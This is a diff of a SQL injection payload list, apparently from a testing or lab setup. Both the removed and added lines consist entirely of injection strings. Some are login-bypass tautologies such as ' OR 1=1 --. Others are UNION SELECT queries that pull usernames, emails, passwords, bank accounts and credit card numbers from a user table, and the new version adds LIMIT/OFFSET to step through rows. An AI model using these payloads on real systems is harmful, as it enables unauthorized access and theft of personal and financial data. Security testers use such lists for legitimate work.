@@ -1,14 +1,13 @@
-" OR "1"="1" --
-' OR 1=1 --
-' OR '1'='1'' -- 
-") OR "1"="1" --
-' OR '1'='1'' # 
-' OR '1'='1'/*
-" OR 1=1 --
-" OR '1'='1' -- -
-" OR '1'='1' #
-" OR '1'='1'/*
-' OR 1=1 '-- -
-' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL' --  
-' UNION SELECT NULL, username, email, password, bank_account, credit_card FROM user' --  
-' UNION SELECT NULL, database(), user(), NULL, NULL, NULL '--  
+' OR '1'='1' -- 
+' OR 1=1 -- 
+' OR '1'='1' -- 
+' OR "1"="1" -- 
+' OR '1'='1' # 
+' UNION SELECT NULL, username, email, password, bank_account, credit_card FROM user -- 
+' UNION SELECT 1, username, email, password, bank_account, credit_card FROM user -- 
+' UNION SELECT id, username, email, password, bank_account, credit_card FROM user LIMIT 1 OFFSET 1 -- 
+' UNION SELECT id, username, email, password, bank_account, credit_card FROM user WHERE id > 1 LIMIT 1 -- 
+
+
+ 
+
